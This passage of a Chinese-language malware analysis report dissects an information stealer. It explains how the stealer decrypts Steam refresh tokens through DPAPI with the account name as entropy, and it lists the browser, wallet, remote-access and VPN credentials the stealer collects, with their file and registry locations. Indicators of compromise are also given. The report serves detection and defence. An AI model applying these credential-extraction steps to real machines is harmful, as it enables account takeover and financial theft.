![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3c4a9eb7696debc6.webp)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/aafa512d49be093b.webp)

恶意软件在内存中实例化了一个 Counter.CounterApplications 的对象，用于实时追踪和记录被盗资产。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/565f03870f6f847c.webp)

它将物理磁盘路径（如 c:/program files...）与内存 Zip 包中的虚拟路径（如 Steam\\configs\\...）进行映射拼接。这些映射记录最终会被统一汇总至 IntelIX.txt 清单中，为黑客提供一份清晰的数据清单。

Windows Data Protection API (DPAPI) 是微软提供的一套底层数据加密接口，其核心机制是利用当前 Windows 登录用户的密码 Hash 作为主密钥进行加密。Steam 客户端正是调用该 API 对本地登录会话进行加密存储的。该恶意软件寄生于当前受害者的上下文环境中，利用同等权限实现逆向解密：

恶意软件首先在 %LocalAppData%\\Steam 和 %ProgramFiles%\\Steam\\config 目录下交替寻找 loginusers.vdf 与 local.vdf (存储登录Steam的凭证信息)，并根据正则规则提取信息

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fb1700947acf643d.webp)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0f158f51f95de7c7.webp)

在调用 Windows 底层的 DPAPI 解密函数 ProtectedData.Unprotect(密文, 附加熵, 作用域) 之前，恶意软件必须把从文本文件中抓取到的字符串转换成符合 API 要求的原始字节流。ProtectedData.Unprotect 的参数 array4 是核心密文，来自于正则 text21 对 local.vdf 文件的匹配。这个正则匹配的是长度在 500 到 2000 之间的纯十六进制字符串（由数字 0-9 和字母 a-f 组成）。这就是 Steam 缓存在本地的被高度加密的 Refresh Token（长效刷新令牌）。恶意软件在进行解密前会先把十六进制字符串转换为该API要求的原始字节流。参数 bytes 是用户的账号名，在传参之前也会转换成原始字节流。

在 DPAPI 解密机制中，这个 bytes 扮演的是 Optional Entropy（可选附加熵 / 盐值） 的角色。

**Steam的防护机制**

如果 Steam 只用当前 Windows 用户的身份加密令牌，那么同一个电脑上的其他恶意软件（即使没有针对 Steam 编写）只要调用 DPAPI 就能解开它。为了增加安全性，Steam 在加密时，把当前玩家的账号名作为“盐（Salt）”掺了进去。

**恶意软件的破解逻辑**

只有同时知道“当前 Windows 用户权限” + “正确的 Steam 账号名”，DPAPI 才会同意解密。因此，木马必须先用正则把账号名转成 bytes，作为解密的第二把钥匙喂给 API。

核心窃密代码如下：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2089cc150cd64151.webp)

在API执行完成，明文 Refresh Token 就完整的出现在了内存当中。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/19b9a3464cc00b8c.webp)

最后，木马将解密出的明文追加写入 Token.txt 中。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e020d9be9a951418.webp)

拿到明文 Refresh Token 的黑客，可直接利用其向 Steam API 换取无限制的会话访问权，实现彻底的账号接管。

**数据打包**

通过审计 CounterBrowser 内部类的属性定义，我们发现该恶意软件对浏览器数据的窃取深度远超普通的“账号+密码”：

> public ConcurrentLong Cookies; // 会话令牌
> 
> public ConcurrentLong Password; // 明文密码
> 
> public ConcurrentLong CreditCards; // 信用卡明文/加密数据
> 
> public ConcurrentLong AutoFill; // 自动填充表单（常包含真实姓名、家庭住址、电话）
> 
> public ConcurrentLong RestoreToken; // 账户恢复凭证
> 
> public ConcurrentLong MaskedIban; // 掩码处理的国际银行账户号码

除了常规凭证，该恶意软件也关注财务数据和身份恢复凭证。这意味着黑产买家的最终目的不仅是接管虚拟账号，更是直接瞄准了受害者的信用卡盗刷与法币资金转移。

该恶意软件将所有聚合到的统计数据转化为了一份结构化的纯文本清单：

代码 将各个分类的受害资产汇总成了清晰的账单格式（例如 \[Browsers\] \[--数量--\] \[Chrome, Edge\]、\[CryptoDesktop\] \[--数量--\] 等）。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/85de0c4cb17d0c79.webp)

最终打包落盘

> zip.AddTextFile("IntelIX.txt", string.Join("\\n", list));

所有生成的清单文本，最终被合并命名为 IntelIX.txt 并塞入内存压缩包中。这份文件相当于黑客的“战利品装箱单”，降低黑产团伙洗号变现的筛号成本。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ecb71f360c00ec06.webp)

InMemoryZip 的 IntelIX.txt 的内存视图如下：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ce73d7ee1f331d23.webp)

\[截获的内存原始数据 - IntelIX.txt\]内容如下：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e34c8bbcf2c6152d.webp)

## 五、IoCs

1.计划任务与进程检测

**检测对象：** 监控系统中是否存在名称为 SysCoreUpdate 和 WinDefender 的计划任务。

2.启动项监控特征

**注册表路径：**

> HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SysCore
> 
> HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SysCore
> 
> HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WinDefender
> 
> HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinDefender

**物理路径：**

> 查看 %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ 目录下是否存在名为 SysCore.lnk 和 svchost 文件。
> 
> 快速研判命令： 在 PowerShell 中执行 Get-Content 查看该文件，若包含 \[InternetShortcut\] 和 URL=file:/// 关键字，即可实槌感染。

3.文件特征

**1.MD5：** 1fc3676e9b6dee2ed1d7dff47a0363a7

## 附录

**恶意软件核心能力与目标资产矩阵**

该恶意软件内部采用高度模块化的面向对象设计，所有资产窃取模块均实现了统一接口。

**1\. 游戏平台与虚拟资产**

恶意软件内部类名 | 核心窃取对象与潜在危害

Steam | 窃取 ssfn 授权文件、config/\*.vdf 配置文件，通过 DPAPI 解密 Refresh Token 绕过 2FA。

BattleNet | 暴雪战网客户端。窃取本地登录凭证、缓存的会话令牌以实现免密越权登录。

ElectronicArts | EA 游戏平台（原 Origin）。收割本地账号配置文件及虚拟财产资产数据。

Epic | Epic Games 客户端。窃取存储在 LocalAppData 下的登录会话和 OAuth Token。

Riot | 拳头游戏平台（英雄联盟/瓦罗兰特）。扫描本地 Session 票据，危及游戏账号安全。

Roblox | 罗布乐思。利用特定路径或 Cookie 检索.ROBLOSECURITY 令牌，直接接管账号。

Minecraft | 我的世界。扫描 launcher_profiles.json 提取微软或第三方账号授权 Token。

Growtopia | 窃取本地 save.dat 文件，获取用户的账号、密码以及游戏内货币与道具。

XBox | 微软 Xbox 游戏服务。尝试提取本地缓存的 Xbox 令牌和关联的 Live 凭证。

GameList | 扫描系统已安装的游戏清单，用于评估受害主机账号的整体“黑产黑市”价值。

**2\. 开发者、运维的远程连接凭据**

*警告：此类别资产如果外泄，将直接导致企业内网、生产服务器及代码仓库面临连锁失陷风险。*

恶意软件内部类名 | 核心窃取对象与潜在危害

MobaXterm | 高危：窃取存储的服务器 SSH 密码、私钥路径及配置。黑客可借此直接横向移动至 Linux 服务器。

Navicat | 高危：解密并窃取 Navicat 注册表或配置文件中的数据库连接密码，导致核心数据库直接暴露。

PuTTY | 窃取注册表 Software\\SimonTatham\\PuTTY\\Sessions 下硬编码的远程服务器连接和私钥配置。

WinSCP | 提取本地缓存的 FTP/SFTP 连接密码，窃取受信任服务器的文件传输权限。

FileZilla | 提取 sitemanager.xml 和 recentservers.xml 中的明文 FTP 账号与密码。

GithubGui | 扫描 GitHub Desktop 客户端缓存，窃取开发者的 GitHub 访问令牌（Access Token）和源码权限。

JetBrains | 检索本地各类 IDE（IntelliJ, PyCharm 等）的最近项目记录、缓存密码及安全凭证。

Rdp / RDCMan | 提取 Windows 远程桌面连接缓存（.rdp）以及微软远程桌面管理器配置，获取内网机器控制权。

AnyDesk | 远程桌面软件。提取本地 service.conf 或本地无人值守连接密码（Password Hash）。

Sunlogin | 向日葵远程控制。提取本地配置文件中的明文快速访问码和验证码。

TeamViewer | 远程控制。检索注册表或内存中的硬编码临时/固定访问密码。

Xmanager | 针对网管运维套件。提取 Xshell、Xftp 中保存的商业服务器远程控制凭证。

Ngrok | 内网穿透工具。盗取 ngrok.yml 中的 authtoken，允许攻击者劫持或滥用受害者的隧道服务。

PlayIt | 内网穿透/网络映射工具。收割本地配置文件，控制其网络映射隧道。

CoreFtp / CyberDuck | 常见的 FTP/云存储客户端。提取其配置中存储的敏感存储桶（S3 等）或云盘密钥。

TotalCommander | 文件管理器。提取内置保存的 FTP 连接凭证。

FTPCommander / FTPGetter / FTPNavigator / FTPRush | 各种独立 FTP 客户端模块。无差别扫荡本地所有的远程主机传输密码。

**3\. 加密货币与电子钱包**

恶意软件内部类名 | 核心窃取对象与潜在危害

CryptoDesktop | 扫描本地桌面端钱包（如 Exodus, Atomic 等）的本地 LevelDB 数据库或私钥文件。

CryptoChromium | 扫描谷歌内核浏览器中的扩展目录（Extensions），定向劫持 MetaMask, Phantom 等插件钱包的助记词和密码。

CryptoGecko | 针对火狐内核浏览器中的加密钱包插件进行数据检索与收割。

**4\. 即时通讯、社交与邮件**

恶意软件内部类名 | 核心窃取对象与潜在危害

Telegram | 复制 %APPDATA%\\Telegram Desktop\\tdata 下的 D871A4D2C966 等 Session 核心文件，攻击者可在异地实现“无密码直接免密登录”。

Discord | 利用正则表达式搜索 Local Storage\\leveldb 下的文件，匹配并窃取 Discord 访问 Token，用于账密接管和蠕虫传播。

Signal | 高安全性通讯软件。窃取本地未加密的数据库基文件或密钥信息。

Element | 去中心化矩阵（Matrix）通讯客户端。收割其本地 Session 及密钥。

FoxMail / Outlook | 邮件客户端。读取注册表或本地.db 文件，提取企业或个人的历史邮件配置与密码。

Skype / Viber | 提取聊天数据库文件，获取联系人列表与部分聊天历史记录。

TeamSpeak | 游戏语音软件。提取本地保存的服务器认证身份（Identities）和密码。

Icq / Jabber / Pidgin / Tox / MicroSIP | 针对小众/加密或企业内部使用的 IM 软件和 SIP 电话系统的身份凭证实施无差别搜刮。

**5\. VPN 网络与内网跳板资产**

恶意软件内部类名 | 核心窃取对象与潜在危害

OpenVpn | 检索.ovpn 配置文件，可能包含内网路由、服务器地址甚至硬编码的证书密钥。

Cisco | 思科 AnyConnect 企业级 VPN。提取其历史连接配置，获取企业 VPN 的入口网关。

WireGuard | 窃取本地 \*.conf 配置文件，直接获取进入对应加密虚拟网络的私钥。

ProtonVpn / NordVpn / ExpressVPN / SurfShark | 窃取主流商业 VPN 客户端的本地登录账户、Token 或者是保存的节点密码。

Proxifier | 代理链工具。窃取 Profiles/\*.prx 文件，提取用户配置的所有代理服务器（Socks5/HTTPS）及认证密码。

Hamachi / RadminVPN | 虚拟局域网工具。窃取身份凭证，允许攻击者潜入受害者的私有虚拟游戏/办公网络。

SoftEther | 提取其本地连接配置和 VPN 控制台密码。

CyberGhost / HideMyName / IpVanish / MullVad / PIAVPN | 其他商业匿名 VPN。全面扫荡本地残留的认证凭据。

NoIp / DynDns | 动态域名解析工具。提取其账户信息，允许攻击者恶意篡改该受害机绑定的动态域名指向。
